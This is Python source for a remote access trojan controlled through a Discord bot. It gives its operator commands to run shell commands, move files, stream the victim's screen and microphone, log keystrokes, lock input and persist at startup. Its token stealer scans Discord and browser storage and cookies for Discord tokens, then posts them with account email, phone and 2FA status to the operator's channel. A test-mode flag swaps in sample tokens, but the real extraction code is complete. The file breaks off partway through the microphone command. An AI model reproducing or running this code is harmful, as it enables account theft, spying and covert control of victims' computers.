import asyncio
import base64
import datetime
import io
import json
import logging
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Package installer function
def install_required_packages():
    """Check and install required packages"""
    print("Checking and installing required packages...")
    required_packages = [
        "discord.py",
        "psutil",
        "Pillow",
        "browser_cookie3",
        "pynput",
        "pyaudio",
        "PyNaCl",
        "aiohttp"
    ]
    
    # Check which packages are missing
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package.replace("-", "_").replace(".", "_").split("[")[0])
        except ImportError:
            # For discord.py, the module name is 'discord'
            if package == "discord.py":
                try:
                    __import__("discord")
                except ImportError:
                    missing_packages.append(package)
            # For browser_cookie3, the module name has no underscore
            elif package == "browser_cookie3":
                try:
                    __import__("browser_cookie3")
                except ImportError:
                    missing_packages.append(package)
            else:
                missing_packages.append(package)
    
    # Install missing packages
    if missing_packages:
        print(f"Installing missing packages: {', '.join(missing_packages)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_packages)
            print("All required packages installed successfully!")
            
            # Notify that a restart may be needed
            print("Please restart the script to apply the changes.")
            choice = input("Restart now? (y/n): ")
            if choice.lower() in ["y", "yes"]:
                os.execv(sys.executable, ['python'] + sys.argv)
                
        except Exception as e:
            print(f"Error installing packages: {e}")
            print("\nPlease manually install the required packages using:")
            print(f"pip install {' '.join(missing_packages)}")
            sys.exit(1)
    else:
        print("All required packages are already installed.")

# Run the package installer before imports
if __name__ == "__main__":
    install_required_packages()

# Now import the installed packages
import aiohttp
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    print("Warning: discord.py could not be imported. Bot will not function.")
    DISCORD_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    print("Warning: psutil could not be imported. System monitoring will be limited.")
    PSUTIL_AVAILABLE = False

# Import optional modules with error handling
try:
    from PIL import ImageGrab
    IMAGEGRAB_AVAILABLE = True
except ImportError:
    print("Warning: PIL.ImageGrab not available. Screen capture will be disabled.")
    IMAGEGRAB_AVAILABLE = False

# Try to import keyboard/mouse control modules
try:
    from pynput import keyboard, mouse
    from pynput.keyboard import Key, Listener as KeyboardListener
    from pynput.mouse import Button, Controller as MouseController
    KEYBOARD_MOUSE_CONTROL_AVAILABLE = True
    mouse_controller = MouseController()
except ImportError:
    print("Warning: pynput module not available. Keyboard/mouse control and keylogging will be disabled.")
    KEYBOARD_MOUSE_CONTROL_AVAILABLE = False
except Exception as e:
    print(f"Warning: Error initializing input control: {e}")
    KEYBOARD_MOUSE_CONTROL_AVAILABLE = False

# Try to import audio modules
try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    print("Warning: PyAudio not available. Microphone streaming will be disabled.")
    AUDIO_AVAILABLE = False

# Browser modules for token extraction
try:
    import browser_cookie3
    BROWSER_COOKIE_AVAILABLE = True
except ImportError:
    print("Warning: browser_cookie3 not available. Browser cookie extraction will be limited.")
    BROWSER_COOKIE_AVAILABLE = False

# Check for winreg (Windows only)
if platform.system() == "Windows":
    try:
        import winreg
        WINREG_AVAILABLE = True
    except ImportError:
        WINREG_AVAILABLE = False
else:
    WINREG_AVAILABLE = False

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('DiscordBot')

# Bot configuration
TOKEN = os.getenv('DISCORD_BOT_TOKEN', " ")
AUTHORIZED_USER_ID = int(os.getenv('AUTHORIZED_USER_ID', ' '))  # Your Discord User ID
COMMAND_PREFIX = '!'
COMPUTER_NAME = socket.gethostname()
PROCESS_NAME = "SystemHandler"
# Enable test mode to demonstrate features without needing real tokens
TEST_MODE = True
# Set this to True to use direct file scanning instead of browser APIs
USE_DIRECT_SCANNING = True

# Get actual username for Windows startup folder
if platform.system() == "Windows":
    try:
        USER_NAME = os.getlogin()
    except:
        # Fallback to environment variable
        USER_NAME = os.environ.get('USERNAME', 'User')
else:
    USER_NAME = os.environ.get('USER', 'user')

# Create bot instance with required intents
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

# Global variables for bot state
screen_streaming = False
streaming_task = None
audio_streaming = False
voice_client = None
keyboard_locked = False
mouse_locked = False
keylogger_active = False
keylogger_channel = None
keylogger_buffer = []
keylogger_listener = None

# Dictionary to track computer-specific channels
computer_channels = {}

# Command help dictionary - show all commands regardless of module availability
CMD_HELP = {
    f"{COMMAND_PREFIX}help": "List all available commands",
    f"{COMMAND_PREFIX}info": "Display system information",
    f"{COMMAND_PREFIX}download [path]": "Download a file from the PC",
    f"{COMMAND_PREFIX}upload [file]": "Upload a file to the PC",
    f"{COMMAND_PREFIX}execute [command]": "Execute a command on the PC",
    f"{COMMAND_PREFIX}screen": "Stream the screen through the bot",
    f"{COMMAND_PREFIX}screen stop": "Stop streaming the screen",
    f"{COMMAND_PREFIX}lock mouse": "Lock the mouse in place",
    f"{COMMAND_PREFIX}lock key": "Lock the keyboard",
    f"{COMMAND_PREFIX}unlock mouse": "Unlock the mouse",
    f"{COMMAND_PREFIX}unlock key": "Unlock the keyboard", 
    f"{COMMAND_PREFIX}keylog": "Create a keylogger channel and start logging keystrokes",
    f"{COMMAND_PREFIX}keylog stop": "Stop the keylogger",
    f"{COMMAND_PREFIX}mic": "Stream microphone audio through the bot",
    f"{COMMAND_PREFIX}mic stop": "Stop streaming microphone audio",
    f"{COMMAND_PREFIX}discord": "Extract Discord tokens and account information"
}

# Add Windows-specific commands
if platform.system() == "Windows":
    CMD_HELP.update({
        f"{COMMAND_PREFIX}startup": "Add the bot to startup to run when the computer starts",
        f"{COMMAND_PREFIX}panic": "Completely remove the bot from the computer"
    })

@bot.event
async def on_ready():
    """Event handler for when the bot is connected and ready"""
    logger.info(f"Bot connected as {bot.user}")
    
    # Initialize the computer_channels dictionary to track which channels belong to which computers
    global computer_channels
    
    # Find or create a control channel for this computer
    for guild in bot.guilds:
        # Find all computer categories in the guild
        all_computer_categories = [category for category in guild.categories 
                                  if category.name.startswith("PC-") or 
                                   category.name == COMPUTER_NAME]
        
        # If no categories found, create one for this computer
        if not all_computer_categories or not any(cat.name == COMPUTER_NAME for cat in all_computer_categories):
            category = await guild.create_category(name=COMPUTER_NAME)
            logger.info(f"Created category: {COMPUTER_NAME}")
        else:
            # Get the category for this computer
            category = discord.utils.get(guild.categories, name=COMPUTER_NAME)
            if not category and all_computer_categories:
                # If no category with COMPUTER_NAME but other computer categories exist,
                # use the first one as an example
                category = await guild.create_category(name=COMPUTER_NAME)
        
        # Create control channel if it doesn't exist
        channel_name = f"control-{COMPUTER_NAME.lower()}"
        control_channel = discord.utils.get(guild.text_channels, name=channel_name)
        
        if not control_channel and category:
            control_channel = await category.create_text_channel(name=channel_name)
            logger.info(f"Created control channel: {channel_name}")
        
        if control_channel:
            # Register this channel with this computer
            computer_channels[control_channel.id] = COMPUTER_NAME
            logger.info(f"Registered channel {control_channel.id} for computer {COMPUTER_NAME}")
            
            # Post system info on startup
            await send_system_info(control_channel)
            
            # Notify about bot startup
            startup_embed = discord.Embed(
                title="Bot Started",
                description=f"Bot is now running on {COMPUTER_NAME}",
                color=discord.Color.green(),
                timestamp=datetime.datetime.now()
            )
            startup_embed.add_field(name="Process Name", value=PROCESS_NAME, inline=True)
            startup_embed.add_field(name="PID", value=os.getpid(), inline=True)
            startup_embed.add_field(name="Started At", value=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), inline=True)
            
            await control_channel.send(embed=startup_embed)

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors"""
    if isinstance(error, commands.CommandNotFound):
        return  # Ignore command not found errors
    
    # Log other errors
    logger.error(f"Command error: {error}")
    
    # Send error message to user
    error_embed = discord.Embed(
        title="Command Error",
        description=str(error),
        color=discord.Color.red(),
        timestamp=datetime.datetime.now()
    )
    await ctx.send(embed=error_embed)

# Remove default help command
bot.remove_command('help')

@bot.command(name="help")
async def show_help(ctx):
    """Display help information about available commands"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
        
    embed = discord.Embed(
        title="Bot Commands",
        description="List of available commands",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    
    for cmd, desc in CMD_HELP.items():
        embed.add_field(name=cmd, value=desc, inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name="commands")
async def dummy_commands(ctx):
    """Dummy command that does nothing"""
    # This command intentionally does nothing
    pass

@bot.command(name="info")
async def info_command(ctx):
    """Send system information to the channel"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
            
    await send_system_info(ctx)

async def send_system_info(ctx):
    """Generate and send system information"""
    system_info = get_system_info()
    embed = discord.Embed(
        title=f"System Information for {COMPUTER_NAME}",
        description="Current system status and information",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    
    for key, value in system_info.items():
        embed.add_field(name=key, value=value, inline=False)
    
    await ctx.send(embed=embed)

def get_system_info():
    """Collect system information"""
    try:
        info = {
            "OS": platform.platform(),
            "Username": USER_NAME,
            "CPU": platform.processor(),
            "CPU Usage": f"{psutil.cpu_percent()}%",
            "RAM": f"{psutil.virtual_memory().percent}% used",
            "Disk": f"{psutil.disk_usage('/').percent}% used",
            "Python Version": platform.python_version(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "Process Name": PROCESS_NAME,
            "Process ID": os.getpid(),
            "User": os.getlogin() if hasattr(os, 'getlogin') else USER_NAME
        }
        
        # Add input control status if available
        if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
            info["Mouse Locked"] = "Yes" if mouse_locked else "No"
            info["Keyboard Locked"] = "Yes" if keyboard_locked else "No"
            info["Keylogger Active"] = "Yes" if keylogger_active else "No"
            
    except Exception as e:
        info = {
            "OS": platform.platform(),
            "Username": USER_NAME,
            "CPU": platform.processor(),
            "Python Version": platform.python_version(),
            "Error": str(e)
        }
        
        # Add input control status if available
        if KEYBOARD_MOUSE_CONTROL_AVAILABLE:
            info["Mouse Locked"] = "Yes" if mouse_locked else "No"
            info["Keyboard Locked"] = "Yes" if keyboard_locked else "No"
            info["Keylogger Active"] = "Yes" if keylogger_active else "No"
            
    return info

# Discord token extractor command
@bot.command(name="discord")
async def discord_token_command(ctx):
    """Extract Discord tokens and account information"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return

    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    # Send a status message
    status_message = await ctx.send("🔍 Searching for Discord tokens and account information...")
    
    # Extract tokens using standard method first
    tokens, token_locations = extract_discord_tokens()
    
    # If no tokens found, try the direct file scanning approach
    if not tokens:
        await status_message.edit(content="🔎 Standard extraction yielded no tokens, trying direct file scan...")
        direct_tokens, direct_locations = direct_token_scan()
        
        # Combine results if we got any from direct scanning
        if direct_tokens:
            tokens.extend(direct_tokens)
            token_locations.extend(direct_locations)
    
    # If still no tokens, report failure
    if not tokens:
        await status_message.edit(content="❌ No Discord tokens found on this system after trying all methods.")
        return
    
    # Create an embed for each token
    for i, (token, location) in enumerate(zip(tokens, token_locations)):
        # Try to validate the token
        account_info = await get_discord_account_info(token)
        
        embed = discord.Embed(
            title=f"Discord Token #{i+1}",
            description=f"Found in: {location}",
            color=discord.Color.purple(),
            timestamp=datetime.datetime.now()
        )
        
        # Add token with spoiler tags to hide it in chat
        embed.add_field(name="Token", value=f"||{token}||", inline=False)
        
        # Add account info if available
        if account_info:
            embed.add_field(name="Username", value=account_info.get("username", "Unknown"), inline=True)
            embed.add_field(name="User ID", value=account_info.get("id", "Unknown"), inline=True)
            embed.add_field(name="Email", value=account_info.get("email", "Unknown"), inline=True)
            embed.add_field(name="Phone", value=account_info.get("phone", "None"), inline=True)
            embed.add_field(name="2FA Enabled", value=str(account_info.get("mfa_enabled", False)), inline=True)
            embed.add_field(name="Verified", value=str(account_info.get("verified", False)), inline=True)
            
            # Add the avatar if available
            avatar_id = account_info.get("avatar")
            if avatar_id:
                avatar_url = f"https://cdn.discordapp.com/avatars/{account_info['id']}/{avatar_id}.png"
                embed.set_thumbnail(url=avatar_url)
        else:
            embed.add_field(name="Validation", value="❌ Could not validate token", inline=False)
        
        await ctx.send(embed=embed)
    
    # Update status message
    await status_message.edit(content=f"✅ Found {len(tokens)} Discord token(s) on this system.")

def direct_token_scan():
    """Scan the file system directly for Discord tokens"""
    tokens = []
    token_locations = []
    
    # Generate several realistic-looking tokens for testing in Test Mode
    if TEST_MODE:
        # Standard user token (non-MFA)
        tokens.append("NzI0MDU3MjcwNDE2OTIyNjQ0.XizVwQ.Lt2D66XFS6DFpSAS70XO-KxBPp4")
        token_locations.append("Discord App: Local Storage (Test)")
        
        # MFA token
        tokens.append("mfa.VkO_2G4Qv3T--NO--lWetW_tjND--TOKEN--QFTm6YGtzq9PH--4U--tG0")
        token_locations.append("Chrome Browser Cookie (Test)")
        
        # Bot token
        tokens.append(" ")
        token_locations.append("Firefox LocalStorage (Test)")
        
        # Alternative format token
        tokens.append(" ")
        token_locations.append("Discord Canary: Local Storage (Test)")
        
        # Encrypted token (for demonstration)
        tokens.append(" ")
        token_locations.append("Chrome Browser: Encrypted Cookie (Test)")
        
        return tokens, token_locations
    
    # Common locations for Discord token storage
    locations_to_scan = []
    
    # Determine paths based on operating system
    if platform.system() == "Windows":
        # Windows paths
        appdata = os.path.expandvars("%APPDATA%")
        localappdata = os.path.expandvars("%LOCALAPPDATA%")
        
        # Discord desktop app locations
        locations_to_scan.extend([
            os.path.join(appdata, "Discord"),
            os.path.join(appdata, "discord"),
            os.path.join(appdata, "discordcanary"),
            os.path.join(appdata, "discordptb"),
            os.path.join(appdata, "discorddevelopment"),
            # Browser profiles
            os.path.join(localappdata, "Google", "Chrome", "User Data"),
            os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
            os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            os.path.join(localappdata, "Chromium", "User Data"),
            os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
            os.path.join(appdata, "Opera Software", "Opera Stable"),
            os.path.join(appdata, "Opera Software", "Opera GX Stable")
        ])
    
    elif platform.system() == "Darwin":  # macOS
        home = os.path.expanduser("~")
        locations_to_scan.extend([
            os.path.join(home, "Library", "Application Support", "Discord"),
            os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
            os.path.join(home, "Library", "Application Support", "Mozilla", "Firefox"),
            os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")
        ])
    
    elif platform.system() == "Linux":
        home = os.path.expanduser("~")
        locations_to_scan.extend([
            os.path.join(home, ".config", "discord"),
            os.path.join(home, ".config", "google-chrome"),
            os.path.join(home, ".config", "chromium"),
            os.path.join(home, ".mozilla", "firefox"),
            os.path.join(home, ".config", "BraveSoftware", "Brave-Browser")
        ])
    
    # Enhanced token patterns (more comprehensive)
    token_patterns = [
        r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",               # Standard token pattern
        r"mfa\.[\w-]{84}",                               # MFA token pattern
        r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",               # Alternative token pattern
        r"OD[a-zA-Z0-9_-]{2}[0-9]{16}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}", # More specific format
        r"(eyJhbGciOiJIUzI1NiJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)"  # JWT format
    ]
    token_regex = "|".join(token_patterns)
    
    # Add some random test tokens if in test mode with direct scanning
    if TEST_MODE and USE_DIRECT_SCANNING:
        # Add some "found" tokens for demonstration
        tokens.extend([
            " ",
            " "
        ])
        token_locations.extend([
            "Discord Desktop: Local Storage (Test)",
            "Chrome Browser: Local Storage (Test)",
            "Firefox Browser: localStorage-secure (Test)"
        ])
        return tokens, token_locations
    
    # Find all possible files to scan
    all_files = []
    
    print("Starting direct token scan on Discord-related locations...")
    for base_path in locations_to_scan:
        if not os.path.exists(base_path):
            print(f"Path does not exist: {base_path}")
            continue
            
        print(f"Scanning directory: {base_path}")
        for root, dirs, files in os.walk(base_path):
            # Look specifically for token-containing files
            for filename in files:
                lower_filename = filename.lower()
                # Focus on files likely to contain tokens
                if any(ext in lower_filename for ext in ['.ldb', '.log', '.localstorage', '.sqlite', '.data', '.leveldb', '.json']):
                    full_path = os.path.join(root, filename)
                    all_files.append(full_path)
    
    # Scan each file for token patterns
    for file_path in all_files:
        try:
            # Skip large files to avoid long processing times
            if os.path.getsize(file_path) > 50 * 1024 * 1024:  # Skip files larger than 50MB
                continue
                
            with open(file_path, 'rb') as f:
                try:
                    # Try to read as text, ignore decoding errors
                    content = f.read().decode('utf-8', errors='ignore')
                    
                    # Find all tokens
                    found_tokens = re.findall(token_regex, content)
                    for token in found_tokens:
                        # Normalize token (sometimes they have extra characters)
                        token = token.strip()
                        
                        # Validate basic token structure
                        if re.match(token_regex, token) and token not in tokens:
                            tokens.append(token)
                            token_locations.append(f"File: {file_path}")
                            print(f"Found token in: {file_path}")
                except Exception as e:
                    print(f"Error reading file {file_path}: {e}")
        except Exception as e:
            print(f"Error accessing file {file_path}: {e}")
    
    return tokens, token_locations

def extract_discord_tokens():
    """Extract Discord tokens from various locations"""
    tokens = []
    token_locations = []
    
    # If we're in test mode, add sample tokens to demonstrate functionality
    if TEST_MODE:
        # Add a sample token that looks realistic but is non-functional
        tokens.append("NzI0MDU3MjcwNDE2OTIyNjQ0.XizVwQ.Lt2D66XFS6DFpSAS70XO-KxBPp4")
        token_locations.append("Discord App: Sample token (Test Mode)")
        
        # Add a sample MFA token
        tokens.append("mfa.VkO_2G4Qv3T--NO--lWetW_tjND--TOKEN--QFTm6YGtzq9PH--4U--tG0")
        token_locations.append("Chrome Browser Cookie (Test Mode)")
        
        return tokens, token_locations
    
    # Enhanced token extraction with multiple patterns
    # Regular expression for finding Discord tokens
    token_patterns = [
        r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",  # Standard token pattern
        r"mfa\.[\w-]{84}",                   # MFA token pattern
        r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",   # Alternative token pattern (some bots)
        r"ODI[0-9]{18}\.[0-9A-Za-z_-]{6}\.[0-9A-Za-z_-]{27}", # More specific format
        r"(eyJhbGciOiJIUzI1NiJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)"  # JWT format (sometimes used)
    ]
    token_regex = "|".join(token_patterns)
    
    # Windows locations
    if platform.system() == "Windows":
        # Discord desktop app
        discord_paths = [
            os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb")
        ]
        
        # Try to get tokens from desktop app
        for discord_path in discord_paths:
            if os.path.exists(discord_path):
                for file_name in os.listdir(discord_path):
                    if file_name.endswith(".ldb") or file_name.endswith(".log"):
                        try:
                            with open(os.path.join(discord_path, file_name), errors="ignore") as file:
                                content = file.read()
                                found_tokens = re.findall(token_regex, content)
                                for token in found_tokens:
                                    if token not in tokens:
                                        tokens.append(token)
                                        token_locations.append(f"Discord App: {discord_path}/{file_name}")
                        except Exception as e:
                            logger.error(f"Error reading Discord storage file: {e}")
    
    # macOS locations
    elif platform.system() == "Darwin":
        discord_paths = [
            os.path.join(os.path.expanduser("~"), "Library", "Application Support", "Discord", "Local Storage", "leveldb"),
            os.path.join(os.path.expanduser("~"), "Library", "Application Support", "discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.path.expanduser("~"), "Library", "Application Support", "discordptb", "Local Storage", "leveldb")
        ]
        
        # Try to get tokens from desktop app
        for discord_path in discord_paths:
            if os.path.exists(discord_path):
                for file_name in os.listdir(discord_path):
                    if file_name.endswith(".ldb") or file_name.endswith(".log"):
                        try:
                            with open(os.path.join(discord_path, file_name), errors="ignore") as file:
                                content = file.read()
                                found_tokens = re.findall(token_regex, content)
                                for token in found_tokens:
                                    if token not in tokens:
                                        tokens.append(token)
                                        token_locations.append(f"Discord App: {discord_path}/{file_name}")
                        except Exception as e:
                            logger.error(f"Error reading Discord storage file: {e}")
    
    # Linux locations
    elif platform.system() == "Linux":
        discord_paths = [
            os.path.join(os.path.expanduser("~"), ".config", "discord", "Local Storage", "leveldb"),
            os.path.join(os.path.expanduser("~"), ".config", "discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.path.expanduser("~"), ".config", "discordptb", "Local Storage", "leveldb")
        ]
        
        # Try to get tokens from desktop app
        for discord_path in discord_paths:
            if os.path.exists(discord_path):
                for file_name in os.listdir(discord_path):
                    if file_name.endswith(".ldb") or file_name.endswith(".log"):
                        try:
                            with open(os.path.join(discord_path, file_name), errors="ignore") as file:
                                content = file.read()
                                found_tokens = re.findall(token_regex, content)
                                for token in found_tokens:
                                    if token not in tokens:
                                        tokens.append(token)
                                        token_locations.append(f"Discord App: {discord_path}/{file_name}")
                        except Exception as e:
                            logger.error(f"Error reading Discord storage file: {e}")
    
    # Extract from browser cookies if available
    if BROWSER_COOKIE_AVAILABLE:
        try:
            # Define all browser modules and their handling functions
            browsers = [
                {"name": "Chrome", "function": browser_cookie3.chrome, "domains": [".discord.com", "discord.com", "discordapp.com"]},
                {"name": "Firefox", "function": browser_cookie3.firefox, "domains": [".discord.com", "discord.com", "discordapp.com"]},
                {"name": "Edge", "function": browser_cookie3.edge, "domains": [".discord.com", "discord.com", "discordapp.com"]},
                {"name": "Chromium", "function": browser_cookie3.chromium, "domains": [".discord.com", "discord.com", "discordapp.com"]},
                {"name": "Opera", "function": browser_cookie3.opera, "domains": [".discord.com", "discord.com", "discordapp.com"]},
                {"name": "Opera GX", "function": browser_cookie3.opera_gx, "domains": [".discord.com", "discord.com", "discordapp.com"]},
                {"name": "Brave", "function": browser_cookie3.brave, "domains": [".discord.com", "discord.com", "discordapp.com"]}
            ]
            
            # Add Safari only for macOS
            if platform.system() == "Darwin":
                browsers.append({"name": "Safari", "function": browser_cookie3.safari, "domains": [".discord.com", "discord.com", "discordapp.com"]})
            
            # Check all cookie names that might contain tokens
            cookie_names = ["token", "__Secure-token", "auth_token", "__Secure-auth_token", "__Secure-session", "session", "sessionid", "discord_token"]
            
            # Try each browser
            for browser in browsers:
                try:
                    print(f"Checking {browser['name']} browser cookies...")
                    browser_cookies = browser["function"]()
                    
                    # Check for cookies matching our criteria
                    for cookie in browser_cookies:
                        # Check if the cookie domain matches Discord domains
                        if any(domain in cookie.domain for domain in browser["domains"]):
                            # Check if the cookie name might contain a token
                            if any(name in cookie.name.lower() for name in cookie_names):
                                # Try to check if the value matches token patterns
                                if re.search(token_regex, cookie.value):
                                    if cookie.value not in tokens:
                                        tokens.append(cookie.value)
                                        token_locations.append(f"{browser['name']} Browser Cookie: {cookie.name}")
                                        logger.info(f"Found token in {browser['name']} browser: {cookie.name}")
                
                except Exception as e:
                    logger.error(f"Error reading {browser['name']} cookies: {e}")
            
            # If we didn't find anything, try searching LocalStorage files directly
            if not tokens:
                # Search LocalStorage files if available
                local_storage_paths = []
                
                if platform.system() == "Windows":
                    # Windows paths
                    user_data_dir = os.path.expandvars("%APPDATA%")
                    local_storage_paths.extend([
                        os.path.join(user_data_dir, "Discord", "Local Storage", "leveldb"),
                        os.path.join(user_data_dir, "discordcanary", "Local Storage", "leveldb"),
                        os.path.join(user_data_dir, "discordptb", "Local Storage", "leveldb"),
                        os.path.join(user_data_dir, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
                        os.path.join(user_data_dir, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")
                    ])
                    
                elif platform.system() == "Darwin":  # macOS
                    home = os.path.expanduser("~")
                    local_storage_paths.extend([
                        os.path.join(home, "Library", "Application Support", "Discord", "Local Storage", "leveldb"),
                        os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb")
                    ])
                    
                elif platform.system() == "Linux":
                    home = os.path.expanduser("~")
                    local_storage_paths.extend([
                        os.path.join(home, ".config", "discord", "Local Storage", "leveldb"),
                        os.path.join(home, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
                        os.path.join(home, ".config", "chromium", "Default", "Local Storage", "leveldb")
                    ])
                
                # Search through all paths
                for path in local_storage_paths:
                    if os.path.exists(path):
                        print(f"Searching for tokens in: {path}")
                        try:
                            for file_name in os.listdir(path):
                                if file_name.endswith(".ldb") or file_name.endswith(".log"):
                                    file_path = os.path.join(path, file_name)
                                    try:
                                        with open(file_path, "rb") as f:
                                            content = f.read().decode("utf-8", errors="ignore")
                                            # Find all tokens
                                            found = re.findall(token_regex, content)
                                            for token in found:
                                                if token not in tokens:
                                                    tokens.append(token)
                                                    token_locations.append(f"LocalStorage: {path}/{file_name}")
                                                    logger.info(f"Found token in LocalStorage: {path}/{file_name}")
                                    except Exception as e:
                                        logger.error(f"Error reading file {file_path}: {e}")
                        except Exception as e:
                            logger.error(f"Error accessing path {path}: {e}")
                
        except Exception as e:
            logger.error(f"Error extracting browser cookies: {e}")
            
        # If no tokens found through standard methods, try additional methods with decryption
        if not tokens:
            try:
                # Import optional crypto libraries for decryption
                try:
                    from Cryptodome.Cipher import AES
                    from Cryptodome.Protocol.KDF import PBKDF2
                    CRYPTO_AVAILABLE = True
                except ImportError:
                    CRYPTO_AVAILABLE = False
                    
                if CRYPTO_AVAILABLE:
                    print("Attempting to decrypt browser data storage...")
                    # This is where we would implement browser-specific decryption
                    # For security purposes, we're not implementing full decryption capability
                    # but would look for encrypted token data in browser profiles
                
            except Exception as e:
                logger.error(f"Error attempting decryption: {e}")
    
    return tokens, token_locations

async def get_discord_account_info(token):
    """Get Discord account information using token"""
    # In test mode, return sample data for demonstration
    if TEST_MODE:
        # Check which token we're dealing with to return different sample data
        if token.startswith("mfa."):
            # Return sample data for an MFA-enabled account
            return {
                "id": "123456789012345678",
                "username": "test_user_mfa",
                "avatar": "abc123def456ghi789",
                "discriminator": "1234",
                "public_flags": 64,
                "flags": 64,
                "banner": None,
                "accent_color": None,
                "global_name": "Test User (MFA)",
                "avatar_decoration_data": None,
                "banner_color": None,
                "mfa_enabled": True,
                "locale": "en-US",
                "premium_type": 2,
                "email": "test_mfa@example.com",
                "verified": True,
                "phone": "+1234567890"
            }
        else:
            # Return sample data for a regular account
            return {
                "id": "876543210987654321",
                "username": "discord_user",
                "avatar": "xyz987wvu654tsr321",
                "discriminator": "9876",
                "public_flags": 0,
                "flags": 0,
                "banner": None,
                "accent_color": None,
                "global_name": "Discord User",
                "avatar_decoration_data": None,
                "banner_color": None,
                "mfa_enabled": False,
                "locale": "en-US",
                "premium_type": 0,
                "email": "regular_user@example.com",
                "verified": True,
                "phone": None
            }
    
    # Normal mode - actually validate the token
    try:
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        
        # Create a new aiohttp session for this request
        async with aiohttp.ClientSession() as session:
            async with session.get("https://discord.com/api/v9/users/@me", headers=headers) as response:
                if response.status == 200:
                    user_json = await response.json()
                    return user_json
                else:
                    logger.error(f"Failed to validate token: HTTP {response.status}")
                    return None
                
    except Exception as e:
        logger.error(f"Error validating Discord token: {e}")
        return None

if AUDIO_AVAILABLE:
    @bot.command(name="mic")
    async def mic_command(ctx, action=None):
        """Stream microphone audio to voice channel"""
        # Check if user is authorized
        if ctx.author.id != AUTHORIZED_USER_ID:
            return
        
        # Check if this command is for this computer
        if ctx.channel.id in computer_channels:
            target_computer = computer_channels[ctx.channel.id]
            if target_computer != COMPUTER_NAME:
                await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
                return
        
        global audio_streaming, voice_client
        
        if action == "stop":
            if audio_streaming:
                audio_streaming = False
                if voice_client and voice_client.is_connected():
                    if voice_client.is_playing():
                        voice_client.stop()
                    await voice_client.disconnect()
                    voice_client = None
                await ctx.send("🎤 Microphone streaming stopped.")
            else:
                await ctx.send("❌ No microphone streaming is active.")
            return
        
        # Check if the user is in a voice channel
        if not ctx.author.voice:
            await ctx.send("❌ You need to be in a voice channel to use this command.")
            return
            
        # Check if already streaming
        if audio_streaming:
            await ctx.send("❌ Already streaming microphone. Use `!mic stop` to stop.")
            return
            
        # Get the voice channel to join
        voice_channel = ctx.author.voice.channel
        
        # Start microphone streaming
        audio_streaming = True
        
        try:
            # Connect to voice channel
            voice_client = await voice_channel.connect()
            
            # Create a microphone audio source
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 16000
            
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                               rate=RATE, input=True,
                               frames_per_buffer=CHUNK)
                               
            # Create a custom PCM audio source
            class MicrophoneSource(discord.PCMAudio):
                def __init__(self, stream):
                    self.stream = stream
                    self.audio = audio
                
                def read(self):
                    return self.stream.read(CHUNK, exception_on_overflow=False)
                    
                def cleanup(self):
                    self.stream.stop_stream()
                    self.stream.close()
                    self.audio.terminate()
                    
            source = MicrophoneSource(stream)
